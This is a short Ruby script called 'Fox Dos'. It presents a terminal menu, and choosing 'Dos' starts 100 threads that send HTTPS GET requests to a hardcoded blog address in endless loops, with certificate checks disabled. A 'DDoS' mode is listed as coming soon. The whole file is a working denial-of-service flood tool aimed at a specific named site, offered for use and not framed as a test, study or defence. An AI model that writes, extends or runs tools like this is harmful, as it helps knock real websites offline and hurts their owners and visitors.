require 'net/http'
require 'uri'
require 'concurrent'
require 'cli/ui'

# Function to send a GET request
def send_request(url)
  http = Net::HTTP.new(url.host, url.port)

  # If the URL uses HTTPS, set use_ssl to true
  if url.scheme == 'https'
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  end
  request = Net::HTTP::Get.new(url)
  response = http.request(request)
end

# UI stuff
CLI::UI.frame_style = :bracket
CLI::UI::StdoutRouter.enable
CLI::UI::Frame.open('Fox Dos') do
  selected = nil
  CLI::UI::Prompt::ask('Select one action:') do |handler|
    handler.option('Dos')  { |selection| selected = selection }
    handler.option('DDos (comming soon)')  { |selection| selected = selection }
  end

  # Dos attack
  CLI::UI::Frame.divider("{{v}} #{selected}")
  if selected == 'Dos'

    # Define the target URL
    url = URI('https://meisam3dfox.blog.ir')

    # Number of threads to simulate multiple requests
    num_threads = 100

    # Create a thread pool
    pool = Concurrent::FixedThreadPool.new(num_threads)

    # Submit tasks to the thread pool
    CLI::UI::Spinner.spin("Sending packets: {{@widget/status:1:2:3:4}}") do |spinner|
      num_threads.times do
        pool.post do
          loop do
            send_request(url)
            sleep 0.1 # Adjust the sleep interval as needed
          end
        end
      end
    end

    # Shutdown the pool (this will not happen in this case)
    pool.shutdown
    #pool.wait_for_termination
  else
    puts "Not yet"
  end

end
